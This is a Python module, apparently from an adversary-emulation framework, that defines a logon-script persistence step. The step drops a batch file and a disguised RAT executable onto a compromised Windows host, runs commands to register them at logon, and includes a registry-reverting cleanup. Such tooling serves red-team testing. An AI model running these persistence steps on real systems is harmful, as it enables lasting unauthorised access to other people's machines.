import plugins.adversary.app.config as config
from plugins.adversary.app.commands import static
from plugins.adversary.app.operation.operation import Step, OPRat, OPFile, OPPersistence


class LogonPersistence(Step):
    """
    Description:
        This step attempts to maintain persistence using script configured to run at startup.
    Requirements:
        Requires an elevated rat on the target machine.
    """
    attack_mapping = [('T1037', 'Persistence')]
    display_name = "logon_persistence"
    summary = "Attempts to maintain persistence using a logon script"

    preconditions = [("rat", OPRat({"elevated": True}))]
    postconditions = [("persistence_g", OPPersistence),
                      ("file_g", OPFile)]

    preproperties = ["rat.host.fqdn"]

    significant_parameters = []

    @staticmethod
    def description():
        return "Installing logon script for persistence"

    @staticmethod
    async def simulate(operation, rat, persistence_g, file_g):
        return True

    @staticmethod
    async def action(operation, rat, persistence_g, file_g):
        await operation.drop_file(rat, "C:\\logon.bat", "caldera/templates/filestore/tools/logon.hex")
        await operation.drop_file(rat, "C:\\totally_innocent_executable.exe", config.settings.exe_rat_path)
        await operation.execute_shell_command(rat, *static.logonScriptA())
        await operation.execute_shell_command(rat, *static.logonScriptB())
        file_ref = await file_g({'path': "C://logon.bat", 'host': rat.host, 'use_case': 'dropped'})
        await persistence_g({'host': rat.host, 'script_artifact': file_ref})
        await file_g({'path': "C:\\totally_innocent_executable.exe", 'host': rat.host, 'use_case': 'dropped'})
        await file_g({'path': "C:\\envn.reg", 'host': rat.host, 'use_case': 'dropped'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g, persistence_g):
        for entry in file_g:
            await cleaner.delete(entry)
        for persistence in persistence_g:
            await cleaner.static_revert(persistence, 'reg import C:\\envn.reg && del C:\\envn.reg')